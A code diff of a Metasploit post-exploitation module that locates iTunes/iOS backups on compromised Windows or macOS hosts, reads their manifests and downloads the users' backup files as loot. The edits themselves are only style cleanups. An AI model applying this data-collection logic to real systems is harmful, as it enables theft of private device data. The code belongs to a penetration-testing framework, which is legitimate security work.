@@ -3,6 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'English'
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
@@ -17,7 +18,7 @@ class MetasploitModule < Msf::Post
           'hdm',
           'bannedit' # Based on bannedit's pidgin_cred module structure
         ],
-        'Platform' => %w{osx win},
+        'Platform' => %w[osx win],
         'SessionTypes' => ['meterpreter', 'shell'],
         'Compat' => {
           'Meterpreter' => {
@@ -66,8 +67,8 @@ class MetasploitModule < Msf::Post
         @users = drive + '\\Documents and Settings'
       end
 
-      if session.type != "meterpreter"
-        print_error "Only meterpreter sessions are supported on windows hosts"
+      if session.type != 'meterpreter'
+        print_error 'Only meterpreter sessions are supported on windows hosts'
         return
       end
       paths = enum_users_windows
@@ -77,7 +78,7 @@ class MetasploitModule < Msf::Post
     end
 
     if paths.empty?
-      print_status("No users found with an iTunes backup directory")
+      print_status('No users found with an iTunes backup directory')
       return
     end
 
@@ -86,9 +87,9 @@ class MetasploitModule < Msf::Post
 
   def enum_users_unix
     if @platform == :osx
-      home = "/Users/"
+      home = '/Users/'
     else
-      home = "/home/"
+      home = '/home/'
     end
 
     if got_root?
@@ -96,7 +97,7 @@ class MetasploitModule < Msf::Post
       session.shell_command("ls #{home}").gsub(/\s/, "\n").split("\n").each do |user_name|
         userdirs << home + user_name
       end
-      userdirs << "/root"
+      userdirs << '/root'
     else
       userdirs = [ home + whoami ]
     end
@@ -120,7 +121,7 @@ class MetasploitModule < Msf::Post
     backup_dirs.each do |backup_dir|
       print_status("Checking for backups in #{backup_dir}")
       session.shell_command("ls #{backup_dir}").each_line do |dir|
-        next if dir == "." || dir == ".."
+        next if dir == '.' || dir == '..'
 
         if dir =~ /^[0-9a-f]{16}/i
           print_status("Found #{backup_dir}\\#{dir}")
@@ -178,36 +179,32 @@ class MetasploitModule < Msf::Post
   def process_backup(path)
     print_status("Pulling data from #{path}...")
 
-    mbdb_data = ""
-    mbdx_data = ""
+    mbdb_data = ''
+    mbdx_data = ''
 
     print_status("Reading Manifest.mbdb from #{path}...")
-    if session.type == "shell"
+    if session.type == 'shell'
       mbdb_data = session.shell_command("cat #{path}/Manifest.mbdb")
       if mbdb_data =~ /No such file/i
         print_status("Manifest.mbdb not found in #{path}...")
         return
       end
     else
-      mfd = session.fs.file.new("#{path}\\Manifest.mbdb", "rb")
-      until mfd.eof?
-        mbdb_data << mfd.read
-      end
+      mfd = session.fs.file.new("#{path}\\Manifest.mbdb", 'rb')
+      mbdb_data << mfd.read until mfd.eof?
       mfd.close
     end
 
     print_status("Reading Manifest.mbdx from #{path}...")
-    if session.type == "shell"
+    if session.type == 'shell'
       mbdx_data = session.shell_command("cat #{path}/Manifest.mbdx")
       if mbdx_data =~ /No such file/i
         print_status("Manifest.mbdx not found in #{path}...")
         return
       end
     else
-      mfd = session.fs.file.new("#{path}\\Manifest.mbdx", "rb")
-      until mfd.eof?
-        mbdx_data << mfd.read
-      end
+      mfd = session.fs.file.new("#{path}\\Manifest.mbdx", 'rb')
+      mbdx_data << mfd.read until mfd.eof?
       mfd.close
     end
 
@@ -223,29 +220,27 @@ class MetasploitModule < Msf::Post
     patterns.each do |pat|
       manifest.entries.each_pair do |fname, info|
         next if done[fname]
-        next if not info[:filename].to_s =~ pat
+        next if info[:filename].to_s !~ pat
 
         print_status("Downloading #{info[:domain]} #{info[:filename]}...")
 
         begin
-          fdata = ""
-          if session.type == "shell"
+          fdata = ''
+          if session.type == 'shell'
             fdata = session.shell_command("cat #{path}/#{fname}")
           else
-            mfd = session.fs.file.new("#{path}\\#{fname}", "rb")
-            until mfd.eof?
-              fdata << mfd.read
-            end
+            mfd = session.fs.file.new("#{path}\\#{fname}", 'rb')
+            fdata << mfd.read until mfd.eof?
             mfd.close
           end
-          bname = info[:filename] || "unknown.bin"
-          rname = info[:domain].to_s + "_" + bname
-          rname = rname.gsub(/\/|\\/, ".").gsub(/\s+/, "_").gsub(/[^A-Za-z0-9\.\_]/, '').gsub(/_+/, "_")
-          ctype = "application/octet-stream"
+          bname = info[:filename] || 'unknown.bin'
+          rname = info[:domain].to_s + '_' + bname
+          rname = rname.gsub(%r{/|\\}, '.').gsub(/\s+/, '_').gsub(/[^A-Za-z0-9._]/, '').gsub(/_+/, '_')
+          ctype = 'application/octet-stream'
 
-          store_loot("ios.backup.data", ctype, session, fdata, rname, "iOS Backup: #{rname}")
+          store_loot('ios.backup.data', ctype, session, fdata, rname, "iOS Backup: #{rname}")
         rescue ::Interrupt
-          raise $!
+          raise $ERROR_INFO
         rescue ::Exception => e
           print_error("Failed to download #{fname}: #{e.class} #{e}")
         end
@@ -277,7 +272,7 @@ class MetasploitModule < Msf::Post
     if @platform == :windows
       session.sys.config.getenv('USERNAME')
     else
-      session.shell_command("whoami").chomp
+      session.shell_command('whoami').chomp
     end
   end
 end
